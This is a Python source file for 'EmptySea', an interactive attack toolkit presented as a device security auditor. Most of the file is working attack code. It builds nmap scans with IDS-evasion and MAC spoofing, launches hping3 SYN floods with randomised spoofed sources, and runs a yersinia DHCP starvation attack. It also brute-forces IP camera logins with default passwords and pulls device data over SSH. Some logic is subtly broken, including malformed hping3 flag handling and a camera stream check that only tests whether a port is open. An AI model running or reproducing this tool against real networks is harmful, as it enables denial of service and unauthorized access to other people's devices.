#!/usr/bin/env python3
import os
import sys
import subprocess
import paramiko
import requests
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings for self-signed certificates
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ANSI Color Codes for a Premium Terminal Look
C_BLUE    = "\033[1;34m"
C_CYAN    = "\033[1;36m"
C_GREEN   = "\033[1;32m"
C_RED     = "\033[1;31m"
C_YELLOW  = "\033[1;33m"
C_MAGENTA = "\033[1;35m"
C_WHITE   = "\033[1;37m"
C_RESET   = "\033[0m"

class EmptySeaFramework:
    def __init__(self):
        self.ip = ""
        self.username = ""
        self.password = ""
        
        # DYNAMIC PATH FIX: Locates the directory of the running script file itself
        script_dir = os.path.dirname(os.path.abspath(__file__))
        self.log_dir = os.path.join(script_dir, "logs")
        
        # Ensure log repository directory exists safely right next to the script
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def draw_banner(self):
        """Displays the stylish EmptySea ASCII logo."""
        banner = r"""
  ______                      _          _____                
 |  ____|                    | |        / ____|               
 | |__   _ __ ___  _ __  _ __| |_ _   _| (___   ___  __ _     
 |  __| | '_ ` _ \| '_ \| '__| __| | | |\___ \ / _ \/ _` |    
 | |____| | | | | | |_) | |  | |_| |_| |____) |  __/ (_| |    
 |______|_| |_| |_| .__/|_|   \__|\__, |_____/ \___|\__,_|    
                  | |              __/ |                      
                  |_|             |___/       v1.2.1
        """
        print(f"{C_CYAN}{banner}{C_RESET}")
        print(f"      {C_YELLOW}[~] Advanced Device Security Evaluation Framework [~]{C_RESET}\n")

    def setup_target(self):
        """Collects the targets configuration upfront. Credentials are completely optional."""
        self.clear_screen()
        self.draw_banner()
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" {C_GREEN}[+] Please Initialize Target Identity Context{C_RESET}")
        print(f" {C_YELLOW}(Note: Leave SSH fields blank if not running SSH audits){C_RESET}")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        
        self.ip = ""
        while not self.ip:
            self.ip = input(f"{C_CYAN} -> Target Device IP Address: {C_RESET}").strip()
        
        self.username = input(f"{C_CYAN} -> SSH Username (Optional):  {C_RESET}").strip()
        self.password = input(f"{C_CYAN} -> SSH Password (Optional):  {C_RESET}").strip()
        
        print(f"\n{C_GREEN}[+] Target parameters successfully loaded.{C_RESET}")
        input(f"\n{C_YELLOW}Press [Enter] to launch the operation command center...{C_RESET}")

    def run_sys_command(self, command_list, log_prefix="engine"):
        """Executes tools, pipes output live to the screen, and commits a clean mirror to a persistent log file."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_ip = self.ip.replace("/", "_")
        log_filename = f"{log_prefix}_{safe_ip}_{timestamp}.log"
        full_log_path = os.path.join(self.log_dir, log_filename)

        try:
            print(f"\n{C_BLUE}[*] Launching background engine: {' '.join(command_list)}{C_RESET}")
            print(f"{C_GREEN}[+] Live session dump mirroring to: {full_log_path}{C_RESET}")
            print(f"{C_RED}[!] Engine active. Press Ctrl+C to terminate the test execution.{C_RESET}\n")
            
            process = subprocess.Popen(command_list, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            with open(full_log_path, "w", encoding="utf-8") as log_file:
                log_file.write(f"=== EMPTYSEA FRAMEWORK AUDIT LOG ===\n")
                log_file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                log_file.write(f"Target IP: {self.ip}\n")
                log_file.write(f"Command Executed: {' '.join(command_list)}\n")
                log_file.write(f"====================================\n\n")
                
                for line in process.stdout:
                    print(f"{C_YELLOW}{line}{C_RESET}", end="")
                    log_file.write(line)
                    log_file.flush()
                    
            process.wait()
            print(f"\n{C_GREEN}[+] Process complete. Logs cleanly finalized to disk storage.{C_RESET}")

        except KeyboardInterrupt:
            print(f"\n{C_RED}[-] Operation halted by user control signal. Saving partial log context...{C_RESET}")
            process.terminate()
        except Exception as e:
            print(f"{C_RED}[-] Internal core execution engine failure: {e}{C_RESET}")

    def run_fingerprint_menu(self):
        """Sub-menu interface allocating choosing between light banner grab or detailed Nmap scanning."""
        self.clear_screen()
        self.draw_banner()
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" {C_MAGENTA}TARGET APPLICATION FINGERPRINT & SERVICE DISCOVERY{C_RESET}")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" [{C_CYAN}1{C_RESET}] Lightweight HTTP Header Grab (Direct connection verification)")
        print(f" [{C_CYAN}2{C_RESET}] Advanced Nmap Scan Engine   (Multi-mode port mapping framework)")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        choice = input(f"{C_WHITE}Select Discovery Module [1-2]: {C_RESET}").strip()

        if choice == "1":
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_filename = f"http_grab_{self.ip}_{timestamp}.log"
            full_log_path = os.path.join(self.log_dir, log_filename)
            
            print(f"\n{C_BLUE}[*] Probing active HTTP/HTTPS service footprints for {self.ip}...{C_RESET}")
            
            output_buffer = []
            for protocol in ["https://", "http://"]:
                try:
                    url = f"{protocol}{self.ip}"
                    response = requests.get(url, timeout=4, verify=False)
                    server_banner = response.headers.get('Server', 'No server software banner exposed')
                    
                    line1 = f"[+] Active Endpoint Discovered: {url}"
                    line2 = f"[+] Server Header Identity: {server_banner}"
                    
                    print(f"{C_GREEN}{line1}{C_RESET}")
                    print(f"{C_GREEN}{line2}{C_RESET}")
                    
                    output_buffer.extend([line1, line2])
                    break
                except requests.exceptions.RequestException:
                    continue
            else:
                fail_msg = "[-] Core web server ports (80/443) refused connection."
                print(f"{C_RED}{fail_msg}{C_RESET}")
                output_buffer.append(fail_msg)

            with open(full_log_path, "w", encoding="utf-8") as f:
                f.write(f"=== EMPTYSEA WEB PROBE LOG ===\nTarget: {self.ip}\n\n" + "\n".join(output_buffer))
            print(f"{C_GREEN}[+] Logs successfully committed to: {full_log_path}{C_RESET}")

        elif choice == "2":
            self.run_nmap_configurator()
        else:
            print(f"{C_RED}[-] Operational module key choice outside parameters.{C_RESET}")

    def run_nmap_configurator(self):
        """Builds and compiles an interactive nmap statement packed with essential tactical options."""
        self.clear_screen()
        self.draw_banner()
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" {C_MAGENTA}NMAP TACTICAL PORT & VULNERABILITY DISCOVERY ENGINE{C_RESET}")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" [{C_CYAN}1{C_RESET}] Stealth SYN Scan (-sS)         [Default - Half-open stealth scan]")
        print(f" [{C_CYAN}2{C_RESET}] Full TCP Connect Scan (-sT)    [Completes handshake, reliable but loud]")
        print(f" [{C_CYAN}3{C_RESET}] UDP Service Scan (-sU)         [Maps UDP protocols like SNMP, DNS, NTP]")
        print(f" [{C_CYAN}4{C_RESET}] Firewall Rule ACK Scan (-sA)   [Maps firewall rulesets & finds filtered ports]")
        print(f" [{C_CYAN}5{C_RESET}] Advanced TCP Xmas Scan (-sX)   [Flushes out older non-stateful firewalls]")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        scan_mode = input(f"{C_WHITE}Select Core Scan Technique [1-5]: {C_RESET}").strip()

        cmd = ["nmap"]

        if scan_mode == "2":
            cmd.append("-sT")
        elif scan_mode == "3":
            cmd.append("-sU")
        elif scan_mode == "4":
            cmd.append("-sA")
        elif scan_mode == "5":
            cmd.append("-sX")
        else:
            cmd.append("-sS")

        print(f"\n{C_CYAN}Define Scope Port Parameters:{C_RESET}")
        print(" Standard Scan  (Checks the top 1,000 most common ports)")
        print(" Fast Scan      (-F: Drops scope down to the top 100 common ports)")
        print(" Custom Defined (-p: Specify explicit entries e.g., 22,80,443 or full ranges 1-65535)")
        port_choice = input(f"{C_WHITE}Select Port Strategy [1-3]: {C_RESET}").strip()
        if port_choice == "2":
            cmd.append("-F")
        elif port_choice == "3":
            custom_ports = input(f"{C_WHITE} -> Type Ports/Ranges: {C_RESET}").strip()
            if custom_ports:
                cmd.extend(["-p", custom_ports])

        print(f"\n{C_CYAN}Select Host Discovery & ICMP Bypass Strategy:{C_RESET}")
        print(" Standard Ping Probing (Verifies target status via ICMP request before port mapping)")
        print(" Treat Host As Up      (-Pn: Bypasses initial ping check, defeats firewall ICMP blocks)")
        ping_choice = input(f"{C_WHITE}Choose Ping Strategy [1-2]: {C_RESET}").strip()
        if ping_choice == "2":
            cmd.append("-Pn")

        if scan_mode not in ["4", "5"]:
            print(f"\n{C_CYAN}Enable Advanced Hardware & Software Identification:{C_RESET}")
            print(" None                 (Returns raw port open/closed states only)")
            print(" Service Versions     (-sV: Queries services to extract application name & exact version)")
            print(" OS Fingerprinting    (-O: Inspects TCP/IP stack behavior to guess exact Operating System)")
            print(" Aggressive Map All   (-A: Combines Service Versions, OS, Traceroute, and default scripts)")
            fingerprint_choice = input(f"{C_WHITE}Choose Identification Level [1-4]: {C_RESET}").strip()
            if fingerprint_choice == "2":
                cmd.append("-sV")
            elif fingerprint_choice == "3":
                cmd.append("-O")
            elif fingerprint_choice == "4":
                cmd.append("-A")

        print(f"\n{C_CYAN}Integrate Nmap Scripting Engine (NSE) Vulnerability Audits:{C_RESET}")
        print(" Skip Scripts         (No automated script audits)")
        print(" Vuln Check Scripts   (--script=vuln: Checks for known CVEs, exploits, and configurations)")
        print(" Firewall Detection   (--script=firewall-bypass: Probes paths to bypass current rules)")
        script_choice = input(f"{C_WHITE}Select NSE Script Integration [1-3]: {C_RESET}").strip()
        if script_choice == "2":
            cmd.append("--script=vuln")
        elif script_choice == "3":
            cmd.append("--script=firewall-bypass")

        print(f"\n{C_CYAN}Configure Firewall/IDS Evasion Tactics:{C_RESET}")
        print(" Normal Packet Structure (Default)")
        print(" Fragment Packets        (-f: Splits headers across smaller frames to bypass simple ACLs)")
        print(" Spoof Source MAC        (--spoof-mac: Spoofs your local identity layout with a custom vendor name)")
        evasion_choice = input(f"{C_WHITE}Select Evasion Strategy [1-3]: {C_RESET}").strip()
        if evasion_choice == "2":
            cmd.append("-f")
        elif evasion_choice == "3":
            vendor = input(f"{C_WHITE} -> Enter target vendor prefix name (e.g., Apple, Cisco, Huawei) [or enter for random]: {C_RESET}").strip()
            mac_param = vendor if vendor else "0"
            cmd.extend(["--spoof-mac", mac_param])

        print(f"\n{C_CYAN}Set Engine Timing Speed Template:{C_RESET}")
        print(" Polite / Normal (-T3: Standard traffic pattern execution layout)")
        print(" Aggressive      (-T4: Speeds up execution significantly, optimal for reliable networks)")
        timing_choice = input(f"{C_WHITE}Select Timing Template [3-4]: {C_RESET}").strip()
        if timing_choice == "4":
            cmd.append("-T4")
        else:
            cmd.append("-T3")

        cmd.append(self.ip)
        self.run_sys_command(cmd, log_prefix="nmap_scan")

    def run_ssh_firmware_audit(self):
        """Automates device firmware mapping via native vendor SSH command profiles."""
        if not self.username or not self.password:
            print(f"\n{C_RED}[-] ERROR: SSH Automated Auditing requires valid credentials.{C_RESET}")
            print(f"{C_YELLOW}[!] Please use Dashboard Option to assign credentials first.{C_RESET}")
            return

        self.clear_screen()
        self.draw_banner()
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" {C_MAGENTA}SELECT TARGET OPERATING DEVICE ARTIFACT PROFILE{C_RESET}")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" [{C_CYAN}1{C_RESET}] Generic Linux Environment (Local Kali Test)")
        print(f" [{C_CYAN}2{C_RESET}] Huawei S-Series Enterprise Switches (VRP)")
        print(f" [{C_CYAN}3{C_RESET}] Hikvision Camera / NVR Systems")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        device_type = input(f"{C_WHITE}Selection Profile [1-3]: {C_RESET}").strip()

        vendor_maps = {
            "1": {"name": "Linux Kernel Profile", "cmd": "uname -a && cat /etc/os-release\n"},
            "2": {"name": "Huawei VRP Profile", "cmd": "display version\ndisplay device\n"},
            "3": {"name": "Hikvision Firmware Profile", "cmd": "getsysinfo\ncat /proc/version\n"}
        }

        if device_type not in vendor_maps:
            print(f"{C_RED}[-] Profile selection key outside operational ranges.{C_RESET}")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_filename = f"ssh_audit_{self.ip}_{timestamp}.log"
        full_log_path = os.path.join(self.log_dir, log_filename)

        print(f"\n{C_BLUE}[*] Injecting interactive shell channel to {self.ip} ({vendor_maps[device_type]['name']})...{C_RESET}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.ip, username=self.username, password=self.password, timeout=8)
            channel = ssh.invoke_shell()
            channel.send(vendor_maps[device_type]['cmd'])
            
            import time
            time.sleep(2)
            
            payload_data = channel.recv(65535).decode('utf-8')
            
            print(f"\n{C_GREEN}" + "#" * 62 + f"\n[+] RETRIEVED VENDOR CONFIGURATION AND FIRMWARE DATA:\n" + "#" * 62 + f"{C_RESET}")
            print(payload_data)
            print(f"{C_GREEN}" + "#" * 62 + f"{C_RESET}")
            
            with open(full_log_path, "w", encoding="utf-8") as f:
                f.write(f"=== EMPTYSEA SSH METRICS LOG ===\nTarget: {self.ip}\nProfile: {vendor_maps[device_type]['name']}\n\n" + payload_data)
            print(f"{C_GREEN}[+] SSH Audit log preserved at: {full_log_path}{C_RESET}")
            
        except Exception as e:
            print(f"{C_RED}[-] Secure access validation or authentication sequence rejected: {e}{C_RESET}")
        finally:
            ssh.close()

    def run_hping3_engine(self):
        """Comprehensive configuration interface for custom hping3 test profiles."""
        self.clear_screen()
        self.draw_banner()
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" {C_MAGENTA}HPING3 ADVANCED TRAFFIC EVALUATION CONFIGURATOR{C_RESET}")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" [{C_CYAN}1{C_RESET}] TCP SYN Attack      (Tests stateful firewall tables & connection limits)")
        print(f" [{C_CYAN}2{C_RESET}] UDP Traffic Test    (Tests non-stateful protocol routing & service exposure)")
        print(f" [{C_CYAN}3{C_RESET}] ICMP Echo Probe     (Tests echo-request latency, routing limits & ping blocks)")
        print(f" [{C_CYAN}4{C_RESET}] Custom TCP Flag Set (Manually select unusual flag states like ACK, FIN, RST)")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        mode = input(f"{C_WHITE}Select Base Traffic Protocol [1-4]: {C_RESET}").strip()

        if mode not in ["1", "2", "3", "4"]:
            print(f"{C_RED}[-] Invalid protocol choice context.{C_RESET}")
            return

        cmd = ["sudo", "hping3"]

        if mode == "1":
            print(f"\n{C_GREEN}[*] Chosen Vector: TCP SYN-Flood Simulation (-S){C_RESET}")
            cmd.append("-S")
        elif mode == "2":
            print(f"\n{C_GREEN}[*] Chosen Vector: UDP Raw Packet Stream (-2){C_RESET}")
            cmd.append("-2")
        elif mode == "3":
            print(f"\n{C_GREEN}[*] Chosen Vector: ICMP Echo-Request Sequence (-1){C_RESET}")
            cmd.append("-1")
        elif mode == "4":
            print(f"\n{C_GREEN}[*] Chosen Vector: Custom TCP Flags Control{C_RESET}")
            print("    Flags Guide: [A] ACK, [F] FIN, [R] RST, [P] PUSH, [U] URG, [S] SYN")
            custom_flags = input(f"{C_WHITE} -> Type desired flags combined (e.g., SA, FR, AP): {C_RESET}").strip().upper()
            if custom_flags:
                cmd.extend(["-F", "-P", "-U", "-A", "-R", "-F"])
                cmd.extend(["-M", custom_flags])

        if mode in ["1", "2", "4"]:
            port_in = input(f"{C_WHITE} -> Target Port (Default 80 for HTTP, 554 for RTSP, 22 for SSH): {C_RESET}").strip()
            port = port_in if port_in else "80"
            cmd.extend(["-p", port])

        print(f"\n{C_CYAN}Select Source IP Handling Strategy:{C_RESET}")
        print(" Randomized Sources (--rand-source: Masks execution location, simulates botnet volume)")
        print(" Direct Identity    (Uses your Kali IP: Essential for predictable routing analysis)")
        src_choice = input(f"{C_WHITE}Choose Strategy [1-2]: {C_RESET}").strip()
        if src_choice == "1":
            cmd.append("--rand-source")

        print(f"\n{C_CYAN}Select Performance Speed Profile:{C_RESET}")
        print(" Flood Configuration   (--flood: Sends packets as fast as possible, no output feedback)")
        print(" Discrete Sample Count (-c: Sends a definitive number of frames to analyze return behaviors)")
        speed_choice = input(f"{C_WHITE}Choose Speed Profile [1-2]: {C_RESET}").strip()

        if speed_choice == "1":
            cmd.append("--flood")
        else:
            count_in = input(f"{C_WHITE} -> Enter explicit packet transmission count (Default 10): {C_RESET}").strip()
            count = count_in if count_in else "10"
            cmd.extend(["-c", count])

        cmd.append(self.ip)
        
        print(f"\n{C_RED}[!] CRITICAL CONFIGURATION COMPILED.{C_RESET}")
        if input(f"{C_WHITE}Confirm execution of this sequence? (y/n): {C_RESET}").lower() == 'y':
            self.run_sys_command(cmd, log_prefix="hping3_test")

    
    def run_ip_camera_auditor(self):
        """Specialized IP Camera & RTSP Stream Discovery Suite"""
        self.clear_screen()
        self.draw_banner()
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" {C_MAGENTA}IP CAMERA & SURVEILLANCE PROTOCOL AUDITOR{C_RESET}")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        print(f" [{C_CYAN}1{C_RESET}] Test RTSP Unauthenticated Stream Access (Port 554)")
        print(f" [{C_CYAN}2{C_RESET}] Automated Default Camera Credentials Brute-Force")
        print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
        cam_choice = input(f"{C_WHITE}Select Surveillance Audit Vector [1-2]: {C_RESET}").strip()

        if cam_choice == "1":
            print(f"\n{C_BLUE}[*] Testing RTSP endpoint isolation on {self.ip}:554...{C_RESET}")
            common_paths = ["", "/Streaming/Channels/101", "/onvif-media/media.amp", "/h264/ch1/main/av_stream", "/live/ch0"]
            found_open = False
            for path in common_paths:
                url = f"rtsp://{self.ip}:554{path}"
                print(f" {C_WHITE}Checking path: {url}...{C_RESET}")
                try:
                    import socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    result = s.connect_ex((self.ip, 554))
                    if result == 0:
                        found_open = True
                        break
                except: pass
            if found_open:
                print(f"\n{C_GREEN}[+] SUCCESS: RTSP Media Port 554 is responsive!{C_RESET}")
                print(f"{C_YELLOW}[!] Stream Endpoint Path mapped. Validate stream visually using VLC: vlc rtsp://{self.ip}:554{C_RESET}")
            else:
                print(f"\n{C_RED}[-] RTSP streaming port 554 is closed or filtered on target.{C_RESET}")

        elif cam_choice == "2":
            print(f"\n{C_BLUE}[*] Starting targeted manufacturer credential audit...{C_RESET}")
            common_creds = [("admin", "admin"), ("admin", "12345"), ("admin", "123456"), ("admin", "password"), ("root", "pass"), ("supervisor", "supervisor")]
            print(f"{C_YELLOW}[*] Testing web administration endpoints against known IoT baselines...{C_RESET}")
            for username, password in common_creds:
                print(f"   Trying context profile -> {username}:{password}")
                try:
                    res = requests.get(f"http://{self.ip}", auth=(username, password), timeout=3, verify=False)
                    if res.status_code == 200:
                        print(f"\n{C_RED}[+] CRITICAL CRACK SUCCESS: Found Valid Admin Creds -> {username}:{password}{C_RESET}")
                        return
                except: pass
            print(f"\n{C_GREEN}[+] Target password dictionary exhausted. No baseline vendor accounts exposed.{C_RESET}")

    def main_dashboard(self):
        self.setup_target()
        
        while True:
            self.clear_screen()
            self.draw_banner()
            
            display_user = self.username if self.username else "NONE (No-Auth Mode)"
            
            print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
            print(f" {C_GREEN}SCOPE TARGET:{C_RESET} {self.ip:18} | {C_GREEN}OPERATOR ID:{C_RESET} {display_user}")
            print(f" {C_CYAN}LOG STORAGE : {self.log_dir}{C_RESET}")
            print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
            print(f" [{C_CYAN}1{C_RESET}] Fingerprint Target (Web Application & Port Mapping)")
            print(f" [{C_CYAN}2{C_RESET}] Audit Hardware & Firmware Details (SSH)")
            print(f" [{C_CYAN}3{C_RESET}] Test Port Security Isolation (Yersinia Engine)")
            print(f" [{C_CYAN}4{C_RESET}] Test Firewall/Rate Limit Controls (Hping3 Engine)")
            print(f" [{C_CYAN}5{C_RESET}] Penetration Test IP Cameras / NVR Devices (Surveillance Engine)")
            print(f" [{C_CYAN}6{C_RESET}] Switch Target Context (Modify IP / Credentials)")
            print(f" [{C_CYAN}7{C_RESET}] Terminate Toolkit Sessions")
            print(f"{C_BLUE}=" * 62 + f"{C_RESET}")
            
            action = input(f"{C_WHITE}Select Operational Vector [1-7]: {C_RESET}").strip()
            
            if action == '1':
                self.run_fingerprint_menu()
                input(f"\n{C_YELLOW}Press [Enter] to return to dashboard...{C_RESET}")
            elif action == '2':
                self.run_ssh_firmware_audit()
                input(f"\n{C_YELLOW}Press [Enter] to return to dashboard...{C_RESET}")
            elif action == '3':
                print(f"\n{C_RED}[!] WARNING: Initializing automated layer-2 DHCP flood rules via Yersinia.{C_RESET}")
                if input(f"{C_WHITE}Do you want to continue? (y/n): {C_RESET}").lower() == 'y':
                    self.run_sys_command(["sudo", "yersinia", "dhcp", "-attack", "1"], log_prefix="yersinia_dhcp")
                input(f"\n{C_YELLOW}Press [Enter] to return to dashboard...{C_RESET}")
            elif action == '4':
                self.run_hping3_engine()
                input(f"\n{C_YELLOW}Press [Enter] to return to dashboard...{C_RESET}")
            elif action == '5':
                self.run_ip_camera_auditor()
                input(f"\n{C_YELLOW}Press [Enter] to return to dashboard...{C_RESET}")
            elif action == '6':
                self.setup_target()
            elif action == '7':
                print(f"\n{C_CYAN}[~] EmptySea connections dropped. Clear anchors. Stay secure!{C_RESET}\n")
                sys.exit()
            else:
                print(f"{C_RED}[-] Operational option index key out of range.{C_RESET}")
                import time; time.sleep(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("\033[1;31m[-] CRITICAL: EmptySea requires raw network socket permissions. Launch with 'sudo'.\033[0m")
        sys.exit(1)
        
    framework = EmptySeaFramework()
    framework.main_dashboard()
EOF